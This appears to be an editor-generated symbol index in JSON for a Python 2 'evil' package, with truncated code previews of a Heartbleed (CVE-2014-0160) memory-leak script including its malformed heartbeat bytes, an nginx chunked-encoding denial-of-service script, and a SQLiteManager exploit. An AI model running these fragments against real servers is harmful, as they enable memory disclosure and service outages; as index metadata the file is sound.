@@ -1,0 +1,259 @@
+[
+    {
+        "label": "sys",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "sys",
+        "description": "sys",
+        "detail": "sys",
+        "documentation": {}
+    },
+    {
+        "label": "argv",
+        "importPath": "sys",
+        "description": "sys",
+        "isExtraImport": true,
+        "detail": "sys",
+        "documentation": {}
+    },
+    {
+        "label": "exit",
+        "importPath": "sys",
+        "description": "sys",
+        "isExtraImport": true,
+        "detail": "sys",
+        "documentation": {}
+    },
+    {
+        "label": "struct",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "struct",
+        "description": "struct",
+        "detail": "struct",
+        "documentation": {}
+    },
+    {
+        "label": "socket",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "socket",
+        "description": "socket",
+        "detail": "socket",
+        "documentation": {}
+    },
+    {
+        "label": "time",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "time",
+        "description": "time",
+        "detail": "time",
+        "documentation": {}
+    },
+    {
+        "label": "select",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "select",
+        "description": "select",
+        "detail": "select",
+        "documentation": {}
+    },
+    {
+        "label": "re",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "re",
+        "description": "re",
+        "detail": "re",
+        "documentation": {}
+    },
+    {
+        "label": "OptionParser",
+        "importPath": "optparse",
+        "description": "optparse",
+        "isExtraImport": true,
+        "detail": "optparse",
+        "documentation": {}
+    },
+    {
+        "label": "httplib",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "httplib",
+        "description": "httplib",
+        "detail": "httplib",
+        "documentation": {}
+    },
+    {
+        "label": "os",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "os",
+        "description": "os",
+        "detail": "os",
+        "documentation": {}
+    },
+    {
+        "label": "urllib2",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "urllib2",
+        "description": "urllib2",
+        "detail": "urllib2",
+        "documentation": {}
+    },
+    {
+        "label": "urlencode",
+        "importPath": "urllib",
+        "description": "urllib",
+        "isExtraImport": true,
+        "detail": "urllib",
+        "documentation": {}
+    },
+    {
+        "label": "h2bin",
+        "kind": 2,
+        "importPath": "evil.heartbleed",
+        "description": "evil.heartbleed",
+        "peekOfCode": "def h2bin(x):\n    return x.replace(' ', '').replace('\\n', '').decode('hex')\nhello = h2bin('''\n16 03 02 00  dc 01 00 00 d8 03 02 53\n43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf\nbd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00\n00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88\n00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c\nc0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09\nc0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44",
+        "detail": "evil.heartbleed",
+        "documentation": {}
+    },
+    {
+        "label": "hexdump",
+        "kind": 2,
+        "importPath": "evil.heartbleed",
+        "description": "evil.heartbleed",
+        "peekOfCode": "def hexdump(s):\n    for b in xrange(0, len(s), 16):\n        lin = [c for c in s[b : b + 16]]\n        hxdat = ' '.join('%02X' % ord(c) for c in lin)\n        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)\n        print '  %04x: %-48s %s' % (b, hxdat, pdat)\n    print\ndef recvall(s, length, timeout=5):\n    endtime = time.time() + timeout\n    rdata = ''",
+        "detail": "evil.heartbleed",
+        "documentation": {}
+    },
+    {
+        "label": "recvall",
+        "kind": 2,
+        "importPath": "evil.heartbleed",
+        "description": "evil.heartbleed",
+        "peekOfCode": "def recvall(s, length, timeout=5):\n    endtime = time.time() + timeout\n    rdata = ''\n    remain = length\n    while remain > 0:\n        rtime = endtime - time.time() \n        if rtime < 0:\n            return None\n        r, w, e = select.select([s], [], [], 5)\n        if s in r:",
+        "detail": "evil.heartbleed",
+        "documentation": {}
+    },
+    {
+        "label": "recvmsg",
+        "kind": 2,
+        "importPath": "evil.heartbleed",
+        "description": "evil.heartbleed",
+        "peekOfCode": "def recvmsg(s):\n    hdr = recvall(s, 5)\n    if hdr is None:\n        print 'Unexpected EOF receiving record header - server closed connection'\n        return None, None, None\n    typ, ver, ln = struct.unpack('>BHH', hdr)\n    pay = recvall(s, ln, 10)\n    if pay is None:\n        print 'Unexpected EOF receiving record payload - server closed connection'\n        return None, None, None",
+        "detail": "evil.heartbleed",
+        "documentation": {}
+    },
+    {
+        "label": "hit_hb",
+        "kind": 2,
+        "importPath": "evil.heartbleed",
+        "description": "evil.heartbleed",
+        "peekOfCode": "def hit_hb(s):\n    s.send(hb)\n    while True:\n        typ, ver, pay = recvmsg(s)\n        if typ is None:\n            print 'No heartbeat response received, server likely not vulnerable'\n            return False\n        if typ == 24:\n            print 'Received heartbeat response:'\n            hexdump(pay)",
+        "detail": "evil.heartbleed",
+        "documentation": {}
+    },
+    {
+        "label": "main",
+        "kind": 2,
+        "importPath": "evil.heartbleed",
+        "description": "evil.heartbleed",
+        "peekOfCode": "def main():\n    opts, args = options.parse_args()\n    if len(args) < 1:\n        options.print_help()\n        return\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    print 'Connecting...'\n    sys.stdout.flush()\n    s.connect((args[0], opts.port))\n    print 'Sending Client Hello...'",
+        "detail": "evil.heartbleed",
+        "documentation": {}
+    },
+    {
+        "label": "options",
+        "kind": 5,
+        "importPath": "evil.heartbleed",
+        "description": "evil.heartbleed",
+        "peekOfCode": "options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')\noptions.add_option('-p', '--port', type='int', default=8443, help='TCP port to test (default: 8443)')\ndef h2bin(x):\n    return x.replace(' ', '').replace('\\n', '').decode('hex')\nhello = h2bin('''\n16 03 02 00  dc 01 00 00 d8 03 02 53\n43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf\nbd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00\n00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88\n00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c",
+        "detail": "evil.heartbleed",
+        "documentation": {}
+    },
+    {
+        "label": "hello",
+        "kind": 5,
+        "importPath": "evil.heartbleed",
+        "description": "evil.heartbleed",
+        "peekOfCode": "hello = h2bin('''\n16 03 02 00  dc 01 00 00 d8 03 02 53\n43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf\nbd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00\n00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88\n00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c\nc0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09\nc0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44\nc0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c\nc0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11",
+        "detail": "evil.heartbleed",
+        "documentation": {}
+    },
+    {
+        "label": "hb",
+        "kind": 5,
+        "importPath": "evil.heartbleed",
+        "description": "evil.heartbleed",
+        "peekOfCode": "hb = h2bin(''' \n18 03 02 00 03\n01 40 00\n''')\ndef hexdump(s):\n    for b in xrange(0, len(s), 16):\n        lin = [c for c in s[b : b + 16]]\n        hxdat = ' '.join('%02X' % ord(c) for c in lin)\n        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)\n        print '  %04x: %-48s %s' % (b, hxdat, pdat)",
+        "detail": "evil.heartbleed",
+        "documentation": {}
+    },
+    {
+        "label": "chunk",
+        "kind": 2,
+        "importPath": "evil.nginx_dos",
+        "description": "evil.nginx_dos",
+        "peekOfCode": "def chunk(data, chunk_size):\n    chunked = \"\"\n    chunked += \"%s\\r\\n\" % (chunk_size)\n    chunked += \"%s\\r\\n\" % (data)\n    chunked += \"0\\r\\n\\r\\n\"\n    return chunked\nif sys.platform == 'linux-i386' or sys.platform == 'linux2':\n        os.system(\"clear\")\nelif sys.platform == 'win32':\n        os.system(\"cls\")",
+        "detail": "evil.nginx_dos",
+        "documentation": {}
+    },
+    {
+        "label": "debug",
+        "kind": 5,
+        "importPath": "evil.nginx_dos",
+        "description": "evil.nginx_dos",
+        "peekOfCode": "debug = 0\ndos_packet = 0xFFFFFFFFFFFFFFEC\nsocket.setdefaulttimeout(1)\npacket = 0\ndef chunk(data, chunk_size):\n    chunked = \"\"\n    chunked += \"%s\\r\\n\" % (chunk_size)\n    chunked += \"%s\\r\\n\" % (data)\n    chunked += \"0\\r\\n\\r\\n\"\n    return chunked",
+        "detail": "evil.nginx_dos",
+        "documentation": {}
+    },
+    {
+        "label": "dos_packet",
+        "kind": 5,
+        "importPath": "evil.nginx_dos",
+        "description": "evil.nginx_dos",
+        "peekOfCode": "dos_packet = 0xFFFFFFFFFFFFFFEC\nsocket.setdefaulttimeout(1)\npacket = 0\ndef chunk(data, chunk_size):\n    chunked = \"\"\n    chunked += \"%s\\r\\n\" % (chunk_size)\n    chunked += \"%s\\r\\n\" % (data)\n    chunked += \"0\\r\\n\\r\\n\"\n    return chunked\nif sys.platform == 'linux-i386' or sys.platform == 'linux2':",
+        "detail": "evil.nginx_dos",
+        "documentation": {}
+    },
+    {
+        "label": "packet",
+        "kind": 5,
+        "importPath": "evil.nginx_dos",
+        "description": "evil.nginx_dos",
+        "peekOfCode": "packet = 0\ndef chunk(data, chunk_size):\n    chunked = \"\"\n    chunked += \"%s\\r\\n\" % (chunk_size)\n    chunked += \"%s\\r\\n\" % (data)\n    chunked += \"0\\r\\n\\r\\n\"\n    return chunked\nif sys.platform == 'linux-i386' or sys.platform == 'linux2':\n        os.system(\"clear\")\nelif sys.platform == 'win32':",
+        "detail": "evil.nginx_dos",
+        "documentation": {}
+    },
+    {
+        "label": "strip_tags",
+        "kind": 2,
+        "importPath": "evil.sqlite",
+        "description": "evil.sqlite",
+        "peekOfCode": "def strip_tags(value):\n    #Strip tags with RegEx\n    return re.sub('<[^>]*?>', '', value)\ndef getDbId(sqliteUrl, myDbName):\n    #Find Components\n    htmlRes = urllib2.urlopen(sqliteUrl, None, 120).read()\n    if htmlRes:\n        #If you found it take all the rows\n        td = re.findall('<td class=\"name_db\">(.*?)</td>', htmlRes, re.DOTALL)\n        #Make a dict of stripped columns",
+        "detail": "evil.sqlite",
+        "documentation": {}
+    },
+    {
+        "label": "getDbId",
+        "kind": 2,
+        "importPath": "evil.sqlite",
+        "description": "evil.sqlite",
+        "peekOfCode": "def getDbId(sqliteUrl, myDbName):\n    #Find Components\n    htmlRes = urllib2.urlopen(sqliteUrl, None, 120).read()\n    if htmlRes:\n        #If you found it take all the rows\n        td = re.findall('<td class=\"name_db\">(.*?)</td>', htmlRes, re.DOTALL)\n        #Make a dict of stripped columns\n        for element in td: \n            if strip_tags(element) == myDbName:\n                #Return Id",
+        "detail": "evil.sqlite",
+        "documentation": {}
+    },
+    {
+        "label": "main",
+        "kind": 2,
+        "importPath": "evil.sqlite",
+        "description": "evil.sqlite",
+        "peekOfCode": "def main():\n    print \\\n        'SQLiteManager Exploit\\n' + \\\n        'Made By RealGame\\n' + \\\n        'http://www.RealGame.co.il\\n'\n    if len(argv) < 2:\n        #replace('\\\\', '/') - To Do The Same In Win And Linux\n        filename = argv[0].replace('\\\\', '/').split('/')[-1]\n        print 'Execute Example: ' + filename + ' http://127.0.0.1/sqlite/\\n'\n        exit()",
+        "detail": "evil.sqlite",
+        "documentation": {}
+    }
+]
